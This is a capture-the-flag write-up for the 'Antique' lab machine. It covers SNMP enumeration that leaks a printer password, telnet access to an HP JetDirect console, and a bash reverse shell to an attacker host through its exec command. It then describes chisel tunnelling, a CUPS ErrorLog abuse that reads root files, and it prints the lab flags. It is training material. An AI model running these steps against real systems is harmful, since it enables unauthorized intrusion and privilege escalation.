# Antique

### Content

-   SNMP Enumeration
-   Network Printer Abuse
-   CUPS Administration Exploitation (ErrorLog)
-   (DirtyPipe) [CVE-2022-0847]

### Reconnaissance

Initial reconnaissance for TCP ports

```bash
Nmap 7.92 scan initiated Thu Apr 28 00:19:13 2022 as: nmap -sS -p- --min-rate 5000 --open -Pn -n -vvv -oG allPorts 10.10.11.107
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.107 ()	Status: Up
Host: 10.10.11.107 ()	Ports: 23/open/tcp//telnet///
# Nmap done at Thu Apr 28 00:19:35 2022 -- 1 IP address (1 host up) scanned in 22.31 seconds
```

Port telnet tcp-23 is the only one open, while trying to connect via telnet the following prompt shows up:

```bash
telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password:
```

After several searching with searchsploit, and public exploits, and also default passwords, it seems that not even one of them is actually working, so next step is port enumeration with UDP ports:

```bash

sudo nmap -sU -p- --min-rate 10000 --open -Pn -n 10.10.11.107 -vvv -oN allUDPPorts
Discovered open port 161/udp on 10.10.11.107
161/udp   open          snmp              udp-response ttl 63
```

Open port discovered udp-161 which is a well-known port used for SNMP, in this case we start enumerate with snmpwalk by using a Public community: ^160482

```bash
snmpwalk -v 2c -c Public 10.10.11.107
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
```

Further explanation about communities, OID, MIBs and so on, about SNMP and its functionality can be found under resources section Hacktricks, next step is to enumerate the OIDs under this community:

```bash
snmpwalk -v 2c -c Public 10.10.11.107 1
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

This seems to be some hex characters, by converting back to ascii human readable we’ll get back the following:

```bash
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xxd -r -p
P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5%
```

### Exploitation

This can be the password for the HP JetDirect telnet login prompt, inside we can see the options we have while entering the console, one in particular is the exec which allows us to execute system commands:

```jsx
telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

After knowing that, let’s try to create a reverse shell by abusing it:

On the victim machine: ^9309a9

```bash
> exec bash -c 'bash -i >& /dev/tcp/10.10.16.4/1234 0>&1'
```

On our machine:

```bash
nc -lvnp 1234
```

Then threat the tty for a fully interactive shell: ^267c9b

```bash
nc -lvnp 1234
Connection from 10.10.11.107:44824
bash: cannot set terminal process group (1023): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ ^Z
zsh: suspended  nc -lvnp 1234
❯ stty raw -echo; fg
[1]  + continued  nc -lvnp 1234
                               reset xterm
                                          reset: terminal attributes: No such device or address
                                                                                        lp@antique:~$                                                                                               lp@antique:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'

lp@antique:~$ export TERM=xterm
```

#### Privilege Escalation

By enumerating the services running as follows, we are able to find a local service under port tcp-631: ^dac47f

```bash
lp@antique:~$ netstat -ano tcp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN
tcp        0    144 10.10.11.107:44824      10.10.16.4:1234         ESTABLISHED
tcp        0      0 10.10.11.107:23         10.10.16.4:42692        ESTABLISHED
tcp        0      0 10.10.11.107:23         10.10.16.4:57084        ESTABLISHED
tcp6       0      0 ::1:631                 :::*                    LISTEN
udp        0      0 10.10.11.107:46841      8.8.8.8:53              ESTABLISHED
udp        0      0 0.0.0.0:161             0.0.0.0:*
```

An interesting approach to see if this could be a web server is to send an HTTP request via nc:

```bash
lp@antique:~$ nc localhost 631
GET / HTTP/1.1
Host: localhost

HTTP/1.1 200 OK
Date: Tue, 12 Jul 2022 00:56:16 GMT
Server: CUPS/1.6
Connection: Keep-Alive
Keep-Alive: timeout=30
Content-Language: en_US
Content-Type: text/html; charset=utf-8
Last-Modified: Thu, 13 May 2021 05:36:41 GMT
Content-Length: 3792

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "<http://www.w3.org/TR/html4/loose.dtd>">
<HTML>
<HEAD>
	<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
	<TITLE>Home - CUPS 1.6.1</TITLE>
	<LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
	<LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>
```

As we can see this is a web site because we received a reply back, so let’s try to forward this port back to our attack machine by forwarding it with chisel.

After upload the chisel executable first execute the server on victim machine with the following command: ^45b307

```bash
./chisel.sh server -p 2345 --socks5
2022/07/12 01:06:01 server: Fingerprint ZvOt+3b69ZPjyc0+4rCLVdSLH5WWgTjMEooXy5w8Ddc=
2022/07/12 01:06:01 server: Listening on <http://0.0.0.0:2345>
```

On our machine let’s run this command:

```bash
./chisel_1.7.7_linux_amd64 client 10.10.11.107:2345 1337:socks
2022/07/11 20:11:06 client: Connecting to ws://10.10.11.107:2345
2022/07/11 20:11:06 client: tun: proxy#127.0.0.1:1337=>socks: Listening
2022/07/11 20:11:11 client: Connected (Latency 469.008603ms)
```

Note: Please remember to add the following into the proxychains.conf file where <PROXY_PORT> is the port that we decide to use as a client:

```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 <PROXY_PORT>
```

Now the last step in order to be able to see the port on our browser is to configure this proxy with foxyproxy:

![[Pasted image 20220711213232.png]]

Then, the remote port is accessible through our attack machine by accessing [http://localhost:631](http://localhost:631)

![[Pasted image 20220711213243.png]]

First thing to do is enumerate such web page, looking for further features that allow us to get privilege escalation.

There are a bunch of cups exploits that seems worthy to try, but none of them works fine, so after enumerate a lot of possible intrusion ways:

![[Pasted image 20220711213257.png]]

None of them seems to be working, then by searching on Google we found the following script (for further details go to the resources section):

Tip: while searching on a metasploit exploit, try by searching “exec” on it, it can give useful information.

Let’s strip this script as follows, in first place this script is executing the following command:

![[Pasted image 20220711213311.png]]

Then by looking what is the vairable “ctl_path” we found that it is referencing to the cupsctl command:

![[Pasted image 20220711213323.png]]

Then if we run a “which” command under the victim machine to see if this binary exists: ^4440dd

```bash
lp@antique:/tmp$ which cupsctl
/usr/sbin/cupsctl
```

It exists, so this system complies with the script requirements to be executed, basically what is doing is exchanging the path of the ErrorLog for another file, causing an LFI as a privileged user, in this case as root, so we can abuse of that and retrieve the flag by setting the “ErrorLog” parameter as follows:

```bash
lp@antique:/tmp$ cupsctl ErrorLog="/root/root.txt"
```

Then if we look closer to the script, somewhere it has to retrieve this file:

![[Pasted image 20220711213336.png]]

If we go to that path we can find the flag being displayed:

![[Pasted image 20220711213345.png]]

### Notes

-   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
-   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
-   Chisel has some

### References

[161,162,10161,10162/udp - Pentesting SNMP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)

[metasploit-framework/cups_root_file_read.rb at master · rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb)

# Flags

user.txt

e75b14eca058829486c172070a7e40ef

root.txt

9e820fd80ac206a7d59a624e4ad72f05